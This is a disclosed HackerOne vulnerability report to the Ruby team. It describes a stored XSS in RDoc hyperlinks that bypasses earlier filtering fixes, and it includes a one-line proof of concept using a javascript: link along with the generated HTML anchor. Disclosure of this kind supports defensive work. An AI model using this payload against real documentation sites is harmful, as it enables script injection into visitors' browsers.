# Stored XSS in RDoc hyperlinks through javascript scheme

## Report Details
- **Report ID**: 1977258
- **URL**: https://hackerone.com/reports/1977258
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-05-08T16:17:56.487Z
- **Disclosed**: 2023-07-18T08:42:21.772Z

## Reporter
- **Username**: sighook
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
Hello,

I found that it is possible to bypass the XSS filtering made in a series of patches to solve #1187156 report.  The #1187156 wasn't sent by me, I found the 'hyperlinks' fixes from investigating the git log.

PoC
----

Create the file with the following link:
```
x[javascript:alert(1)]
```
The output html file will contain:
```html
<a href="javascript:alert(1)">x</a>
```

## Impact

A cross-site scripting (XSS) vulnerability allows attackers to execute arbitrary web scripts or HTML via a crafted payload.

## Attachments
No attachments
